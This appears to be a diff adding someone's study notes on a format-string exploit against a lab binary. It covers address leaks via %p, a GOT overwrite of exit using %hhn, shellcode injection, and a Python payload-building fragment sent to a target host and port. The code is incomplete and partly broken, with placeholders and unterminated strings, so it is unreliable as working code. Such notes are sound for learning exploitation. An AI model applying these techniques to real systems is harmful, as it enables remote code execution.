@@ -1,0 +1,99 @@
+Loop, leak, loop, leak
+
+objdump -R format
+nm format | grep main <- find address of main
+
+Pad to make 'hn's start at 10$
+--set byte alignment 
+
+number is the length of string that will be written with %n (64 chars written at a location--dollar argument)
+
+
+Input 8xA and %p to look at registers and stack (no pointer would occur before 6$)
+
+
+1st Loop: Write's shellcode into buffer, overwrite exit with main addr. and then look for the leaked buffer address
+
+The exit address is overwritten by the start of main.
+
+Relative offset remains unchanged to stack address that is leaked
+
+%16$p will give buffer address for example
+	first loop writes shellcode to buffer and overwrites exit to loop back to main
+	second loop gets leak of buffer address (which is first byte of first format string) -> from this derive offset
+
+
+
+//Alter format string and add ( + "\x90"*80 + shellcode (variable--take of \n from previous string) + '\n') to end of 
+
+LOOK UP loop_leak.py
+
+pytohn loop_leak.py tgtaddr tgtport
+
+objdump -R format0 -- displays the GOT (-R relocations Dynamic Relocation Records)
+
+#helpful for take a string, convert to integer and convert to base sixteen
+leak = int(rl(s).strip(),16)
+print"buffer leak: 0x%x" %leak
+
+tgt = leak + 80
+
+_exit = 0x601038 #exit address--must change all six bytes of exit with one format string (can't change it incrementally)
+
+%hhn writes a BYTE at a time
+
+#"little end to big end"
+
+bytes = struct.pack("<Q", tgt)[:6]
+
+print bytes.encode("hex")
+
+total = 0
+fmt=''
+for b in bytes:
+  value = ord(b)
+  need = (value - total) & 0xff #ensures need is always between 0 and 255
+  fmt += "%%%dc" % need
+  fmt += "%??$hhn #no width will always be larger than three digits (255 max) -- %xxxc%xx$hhn
+  idx += 1
+  total += need
+
+print fmt
+
+fmt = fmt.ljust(72, 'A')
+for i in range(6):
+  fmt += struct.pack("<Q", _exit + i)
+
+s.send(fmt + '\n')
+
+interact(s)
+
+execstack -s 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
